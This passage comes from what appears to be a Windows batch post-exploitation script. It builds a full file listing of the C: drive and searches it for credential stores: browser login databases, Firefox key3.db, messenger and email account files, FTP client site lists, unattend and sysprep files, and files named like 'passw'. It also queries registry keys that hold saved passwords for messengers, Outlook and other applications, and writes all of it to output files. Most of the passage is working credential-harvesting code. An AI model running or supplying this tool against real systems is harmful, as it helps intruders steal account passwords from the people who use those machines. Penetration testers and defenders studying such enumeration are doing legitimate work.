findstr /I \.*.\\CCM\\logs %ALLFILES%>>%OUT%
echo [+] iis:>>%OUT%
findstr /I \.*.\\iis.[.]log$ %ALLFILES%>>%OUT%
echo [+] Content.IE:>>%OUT%
findstr /I \.*.\\Content.IE.\\index.dat$ %ALLFILES%>>%OUT%
echo [+] inetpub:>>%OUT%
findstr /I \.*.\\inetpub\\logs\\LogFiles %ALLFILES%>>%OUT%
echo [+] httperr:>>%OUT%
findstr /I \.*.\\httperr\\httpe.*.[.]log$ %ALLFILES%>>%OUT%
echo [+] w3svc1:>>%OUT%
findstr /I \.*.\\logfiles\\w3svc1\\ex.*.[.]log$ %ALLFILES%>>%OUT%
echo [+] Panther:>>%OUT%
findstr /I \.*.\\Panther\\  %ALLFILES% | findstr /VI \.*.Resources\\Themes\\.*.>>%OUT%
echo [+] syspre:>>%OUT%
findstr /I \.*.syspre.*,[.]...$ %ALLFILES%>>%OUT%
echo [+] unatten.txt:>>%OUT%
findstr /I \.*.unatten.*.[.]txt$ %ALLFILES%>>%OUT%
echo [+] unatten.xml:>>%OUT%
findstr /I \.*.unatten.*.[.]xml$ %ALLFILES%>>%OUT%
echo [+] Login.Data:>>%OUT%
findstr /I \.*Login.Data$ %ALLFILES%>>%OUT%
echo [+] Web.Data:>>%OUT%
findstr /I \.*Web.Data$ %ALLFILES%>>%OUT%
echo [+] Credentials.Store:>>%OUT%
findstr /I \.*Credentials.Store$ %ALLFILES%>>%OUT%
echo [+] Credential.Store:>>%OUT%
findstr /I \.*Credential.Store$ %ALLFILES%>>%OUT%
echo [+] Microsoft Credentials:>>%OUT%
findstr /I \.*Microsoft\\Credentials.* %ALLFILES%>>%OUT%
:: Avant Browser:
echo [+] Avant Browser:>>%OUT%
findstr /I \.*forms[.]dat[.]vdt$ %ALLFILES%>>%OUT%
findstr /I \.*default\\formdata\\forms[.]dat$ %ALLFILES%>>%OUT%
:: Comodo Dragon
echo [+] Comodo Dragon:>>%OUT%
findstr /I \.*Dragon\\User.Data\\Default.* %ALLFILES%>>%OUT%
:: CoolNovo
echo [+] CoolNovo:>>%OUT%
findstr /I \.*ChromePlus\\User.Data\\Default.* %ALLFILES%>>%OUT%
:: Firefox
echo [+] Firefox:>>%OUT%
findstr /I \.*Firefox\\Profiles\\.*[.]default$ %ALLFILES%>>%OUT%
findstr /I \.*key3[.]db$ %ALLFILES%>>%OUT%
:: Flock Browser
echo [+] Flock Browser:>>%OUT%
findstr /I \.*Flock\\User.Data\\Default.* %ALLFILES%>>%OUT%
:: Google Chrome
echo [+] Google Chrome:>>%OUT%
findstr /I \.*Chrome\\User.Data\\Default.* %ALLFILES%>>%OUT%
findstr /I \.*Chrome.SXS\\User.Data\\Default.* %ALLFILES%>>%OUT%
:: Internet Explorer
echo [+] Internet Explorer:>>%OUT%
findstr /I \.*Microsoft\\Credentials.* %ALLFILES%>>%OUT%
:: Maxthon
echo [+] Maxthon:>>%OUT%
findstr /I \.*MagicFill.* %ALLFILES%>>%OUT%
findstr /I \.*MagicFill2[.]dat$ %ALLFILES%>>%OUT%
:: Opera
echo [+] Opera:>>%OUT%
findstr /I \.*Wand[.]dat$ %ALLFILES%>>%OUT%
:: Safari
echo [+] Safari:>>%OUT%
findstr /I \.*keychain[.]plist$ %ALLFILES%>>%OUT%
:: SeaMonkey
echo [+] SeaMonkey:>>%OUT%
findstr /I \.*signons[.]sqlite$ %ALLFILES%>>%OUT%
:: AIM
echo [+] AIM:>>%OUT%
findstr /I \.*aimx[.]bin$ %ALLFILES%>>%OUT%
:: Digsby
echo [+] Digsby:>>%OUT%
findstr /I \.*logininfo[.]yaml$ %ALLFILES%>>%OUT%
findstr /I \.*digsby[.]dat$ %ALLFILES%>>%OUT%
:: Meebo Notifier
echo [+] Meebo Notifier:>>%OUT%
findstr /I \.*MeeboAccounts[.]txt$ %ALLFILES%>>%OUT%
:: Miranda IM
echo [+] Miranda IM:>>%OUT%
findstr /I \.*Miranda\\.*[.]dat$ %ALLFILES%>>%OUT%
:: MySpace IM
echo [+] MySpace IM:>>%OUT%
findstr /I \.*MySpace\\IM\\users[.]txt$ %ALLFILES%>>%OUT%
:: Pidgin
echo [+] Pidgin:>>%OUT%
findstr /I \.*Accounts[.]xml$ %ALLFILES%>>%OUT%
:: Skype
echo [+] Skype:>>%OUT%
findstr /I \.*Skype.*config[.]xml$ %ALLFILES%>>%OUT%
:: Tencent QQ
echo [+] Tencent QQ:>>%OUT%
findstr /I \.*Registry[.]db$ %ALLFILES%>>%OUT%
:: Trillian
echo [+] Trillian:>>%OUT%
findstr /I \.*accounts[.]ini$ %ALLFILES%>>%OUT%
:: XFire
echo [+] XFire:>>%OUT%
findstr /I \.*XfireUser[.]ini$ %ALLFILES%>>%OUT%
:: Foxmail
echo [+] Foxmail:>>%OUT%
findstr /I \.*Account[.]stg$ %ALLFILES%>>%OUT%
findstr /I \.*Accounts[.]tdat$ %ALLFILES%>>%OUT%
:: ThunderBird
echo [+] ThunderBird:>>%OUT%
findstr /I \.*signons[.]sqlite$ %ALLFILES%>>%OUT%
:: Windows Live Mail
echo [+] Windows Live Mail:>>%OUT%
findstr /I \.*[.]oeaccount$ %ALLFILES%>>%OUT%
:: FileZilla
echo [+] FileZilla:>>%OUT%
findstr /I \.*recentservers[.]xml$ %ALLFILES%>>%OUT%
:: FlashFXP
echo [+] FlashFXP:>>%OUT%
findstr /I \.*Sites[.]dat$ %ALLFILES%>>%OUT%
:: FTPCommander
echo [+] FTPCommander:>>%OUT%
findstr /I \.*Ftplist[.]txt$ %ALLFILES%>>%OUT%
:: SmartFTP
echo [+] SmartFTP:>>%OUT%
findstr /I \.*SmartFTP.*[.]xml$ %ALLFILES%>>%OUT%
:: WS_FTP
echo [+] WS_FTP:>>%OUT%
findstr /I \.*ws_ftp[.]ini$ %ALLFILES%>>%OUT%
:: Heroes of Newerth
echo [+] Heroes of Newerth:>>%OUT%
findstr /I \.*login[.]cfg$ %ALLFILES%>>%OUT%
:: JDownloader
echo [+] JDownloader:>>%OUT%
findstr /I \.*JDownloader.* %ALLFILES%>>%OUT%
findstr /I \.*database[.]script$ %ALLFILES%>>%OUT%
findstr /I \.*accounts[.]ejs$ %ALLFILES%>>%OUT%
:: OrbitDownloader
echo [+] OrbitDownloader:>>%OUT%
findstr /I \.*sitelogin[.]dat$ %ALLFILES%>>%OUT%
:: Seesmic
echo [+] Seesmic:>>%OUT%
findstr /I \.*data[.]db$ %ALLFILES%>>%OUT%
:: SuperPutty
echo [+] SuperPutty:>>%OUT%
findstr /I \.*sessions[.]xml$ %ALLFILES%>>%OUT%
:: TweetDeck
echo [+] TweetDeck:>>%OUT%
findstr /I \.*TweetDeck.* %ALLFILES%>>%OUT%
findstr /I \.*[.]localstorage$ %ALLFILES%>>%OUT%
echo [+] passw:>>%OUT%
findstr /I \.*passw*.  %ALLFILES% | findstr /VI \.*.chm$ | findstr /VI \.*.log$ | findstr /VI \.*.dll$ | findstr /VI \.*.exe$>>%OUT%

echo [+] Wrote output to: %OUT%
echo.
goto end

::#############################################################################

:do_find_interestingregkeys
set OUT=%RESULTDIR%\findregkeys_%WHOAMI%.txt
echo %SLONGLINE%>%OUT%
echo [+] Finding interesting registry keys | tee -a %OUT%
echo %SLONGLINE%>>%OUT%

:: Source: securityxploded dot com slash passwordsecrets dot php
set KEY="HKCU\SOFTWARE\America Online\AIM6\Passwords"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\AIM\AIMPRO"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Microsoft\Protected Storage System Provider" /v "Protected Storage"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Microsoft\Internet Explorer\IntelliForms\Storage2"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Beyluxe Messenger"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\BigAntSoft\BigAntMessenger\Setting"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Camfrog\Client"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Google\Google Talk\Accounts"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\IMVU"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Nimbuzz\PCClient\Application"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Paltalk"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Yahoo\Pager"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\IncrediMail"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Microsoft\Office\15.0\Outlook\Profiles\Outlook"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows Messenging Subsystem\Profiles"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Microsoft\Windows Messenging Subsystem\Profiles"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Microsoft\Office\Outlookt\OMI Account Manager\Accounts"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Microsoft\Internet Account Manager\Accounts"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Adobe\Common\10\Sites"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Google\Google Desktop\Mailboxes\Gmail"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\DownloadManager\Passwords"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
set KEY="HKCU\SOFTWARE\Google\Picasa"
reg query %KEY% > nul 2>&1
if %ERRORLEVEL% == 0 (
    reg query %KEY%>>%OUT%
)
echo [+] Wrote output to: %OUT%
echo.
goto end

::#############################################################################

:print_header
::cls
echo.
echo %SLONGLINE%
echo  %MY_NAME% %MY_VERSION%
echo %SLONGLINE%
goto :EOF

::#############################################################################

:generate_allfileslist
echo [+] Dumping directory listing

if exist %ALLFILES% (
    echo [+] Note: using existing dirlist: %ALLFILES%
) else (
    dir c:\* /a/s/b>%ALLFILES%
    echo [+] Wrote: %ALLFILES%
)
goto :EOF

::#############################################################################

:grepfiles 
set FNAMEPATTERN=%1
set FCONTENTPATTERN=%2
set OUTFILE=%3

call :generate_allfileslist

set GREP=grep -E -i
REM set GREP=egrep -i

REM echo.Begin: %GREP% %FNAMEPATTERN% "%ALLFILES%">>grepdebugout.txt
for /f "tokens=*" %%a in ('%GREP% %FNAMEPATTERN% "%ALLFILES%"') do (
    REM echo Searching file: %%a>>grepdebugout.txt
    REM echo   %GREP% %FCONTENTPATTERN% "%%a" 2^>nul>>grepdebugout.txt
    set FILENAMEPRINTED=
    for /f "tokens=*" %%f in ('%GREP% %FCONTENTPATTERN% "%%a" 2^>nul') do (
        if not defined FILENAMEPRINTED (
            echo File: %%a:>>%OUTFILE%
            set FILENAMEPRINTED=1
        )
        REM echo   %%f>>grepdebugout.txt
        echo   %%f>>%OUTFILE%
    )
    if defined FILENAMEPRINTED if "%FILENAMEPRINTED%"=="1" (
        echo.>>%OUTFILE%
    )
)
set GREP=
set FILENAMEPRINTED=
set FCONTENTPATTERN=
set FNAMEPATTERN=
set OUTFILE=

goto :EOF

::#############################################################################

:repeatchar 
set REPEATCHAR=%2
set REPEATIMES=%3
set RETSTR=
for /l %%G in (1,1,!REPEATIMES!) do (
    set RETSTR=!RETSTR!!REPEATCHAR!
)
set %1=%RETSTR%
goto :EOF

::#############################################################################

:end
EndLocal
